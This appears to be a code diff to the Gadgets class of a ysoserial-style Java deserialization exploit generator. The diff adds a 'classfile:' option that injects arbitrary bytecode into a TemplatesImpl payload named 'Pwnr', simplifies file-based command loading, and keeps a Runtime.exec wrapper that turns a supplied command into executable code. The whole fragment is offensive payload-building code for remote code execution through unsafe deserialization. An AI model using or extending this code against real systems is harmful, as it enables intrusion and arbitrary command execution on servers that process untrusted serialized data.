@@ -9,11 +9,9 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
-import java.net.URLDecoder;
 import java.util.HashMap;
 import java.util.Map;
 
-import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -122,29 +120,17 @@ public class Gadgets {
         }else if(command.startsWith("codebase64:")){
             byte[] decode = new BASE64Decoder().decodeBuffer(command.substring(11));
             cmd = new String(decode);
-            cmd = new URLDecoder().decode(cmd);
         }else if(command.startsWith("codefile:")){
             String codefile = command.substring(9);
-            try{
-                File file = new File(codefile);
-                if(file.exists()){
-                    FileReader reader = new FileReader(file);
-                    BufferedReader br = new BufferedReader(reader);
-                    StringBuffer sb = new StringBuffer("");
-                    String line = "";
-                    while ((line = br.readLine()) != null) {
-                        sb.append(line);
-                        sb.append("\r\n");
-                    }
-                    cmd = sb.toString();
-                }else{
-                    System.err.println(String.format("[-] %s is not exists!",codefile));
-                    System.exit(0);
-                }
-            }catch (IOException e){
-                e.printStackTrace();
-            }
-        }else {
+            cmd = TransforBytes.readFile(codefile);
+        }else if(command.startsWith("classfile:")){
+            String classfile = command.substring(10);
+            byte[] classBytes = TransforBytes.BytesFromFile(classfile);
+            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
+            Reflections.setFieldValue(templates, "_name", "Pwnr");
+            return templates;
+        }
+        else {
             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                 "\");";
